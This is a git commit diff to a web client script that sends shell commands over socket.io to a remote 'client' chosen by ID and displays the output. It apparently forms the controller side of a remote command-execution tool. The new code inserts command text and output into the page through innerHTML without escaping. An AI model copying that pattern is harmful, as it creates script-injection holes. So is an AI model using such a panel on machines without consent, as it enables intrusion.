dbd770782a8cb67283e0c42697e87f6b6104c89e
Shahin Nikvand <nicefalcon@pm.me>
2021-07-10 20:40:20 -0700

    client view front end "exec" shell commands are working now

--- public/js/webclient.js
+++ public/js/webclient.js
@@ -1,21 +1,35 @@
 const socket = io()
-// On socketio connection emit the tls socket key
 
 const shellInput = document.getElementById('shell-input')
 const clientId = document.getElementById('client-id')
+const responseBlock = document.getElementById('response-block')
+
+let lastShellInput = ''
 
 socket.emit('bind', clientId.innerHTML)
 
-shellInput.addEventListener('keypress', (e) => {
+shellInput.addEventListener('keydown', (e) => {
     if (e.key == 'Enter') {
         socket.emit('cmd', {
             clientId: clientId.innerHTML,
             shellInput: shellInput.value
         })
-        shellInput.value = ''
+        lastShellInput = shellInput.value
+    }
+    if (e.key == 'ArrowUp') {
+        console.log('test')
+        shellInput.value = lastShellInput
     }
 })
 
 socket.on('cmdRes', (data) => {
+    var lines = data.split('\n')
+    responseBlock.innerHTML = `<code class="text-success">${shellInput.value}</code>\n<code></code>\n`
+    shellInput.value = ''
+    
+    for (var i = 0; i < lines.length; i++) {
+        lines[i] = lines[i].replace(/\s/g, '&nbsp;');
+        responseBlock.innerHTML += `<code>${lines[i]}</code>\n`
+    }
     console.log(data)
 })
